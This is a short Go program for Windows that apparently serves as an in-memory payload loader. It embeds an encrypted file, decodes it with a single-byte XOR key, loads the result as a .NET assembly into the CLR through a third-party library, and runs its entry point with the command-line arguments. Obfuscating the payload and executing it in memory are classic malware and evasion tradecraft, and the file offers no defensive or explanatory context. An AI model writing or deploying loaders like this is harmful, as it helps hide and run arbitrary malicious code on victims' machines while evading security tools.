//go:build windows
// +build windows

package main

import (
	_ "embed"
	"fmt"
	"os"

	clr "github.com/hexsecteam/go-invoker-clr"
)

//go:embed file.enc
var testNetCipherdemo []byte

func main() {
    params := os.Args[1:]

	var testNetdemo []byte

	key := byte(133)

	for i := 0; i < len(testNetCipherdemo); i++ {
		testNetdemo = append(testNetdemo, testNetCipherdemo[i]^key)
	}
	// output, _ := LoadBin(testNet, params, "v4.0.30319", true)
	pRuntimeHost, identityString, _ := clr.LoadGoodClr("v4.0.30319", testNetdemo)
	assembly := clr.Load2Assembly(pRuntimeHost, identityString)
	pMethodInfo, _ := assembly.GetEntryPoint()
	clr.InvokeAssembly(pMethodInfo, params)

	fmt.Println("Done Executing ......................")
}
